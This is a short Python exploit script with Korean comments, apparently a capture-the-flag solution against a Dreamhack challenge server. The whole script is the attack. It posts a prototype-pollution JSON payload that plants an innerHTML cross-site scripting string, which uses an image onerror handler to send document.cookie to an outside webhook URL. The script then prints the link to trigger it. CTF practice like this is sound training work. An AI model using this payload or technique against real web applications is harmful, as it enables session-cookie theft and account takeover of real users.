import requests

base_url = "http://host8.dreamhack.games:15911" 
webhook_url = "https://shfpbfc.request.dreamhack.games/"

# writeEffect를 함수가 아닌 문자열로 만들면 실행 시 에러가 나므로
# 객체의 속성 중 하나를 건드려 '할당' 과정에서 스크립트가 실행되게 합니다.
payload = {
    "__proto__": {
        # 'stamp'에 이미지 객체 대신 스크립트를 포함한 HTML 구조를 강제로 밀어넣습니다.
        "stamp": "x",
        "div_stamp": {
            # innerHTML 속성을 오염시키면 appendChild가 호출되기 전에 이미 실행될 수 있습니다.
            "innerHTML": f"<img src=x onerror=\"fetch('{webhook_url}?flag='+document.cookie)\">"
        }
    }
}

# 1. Write - JSON 전송
res = requests.post(f"{base_url}/write", json=payload)
uuid = res.json().get('uuid')
print(f"[+] Generated UUID: {uuid}")
print(f"[+] Test Link: {base_url}/view/{uuid}")

# 2. 직접 접속 확인 (매우 중요)
# 위 링크를 클릭했을 때 'TypeError'가 나더라도 
# 리퀘스트빈에 신호가 오는지 확인하세요.
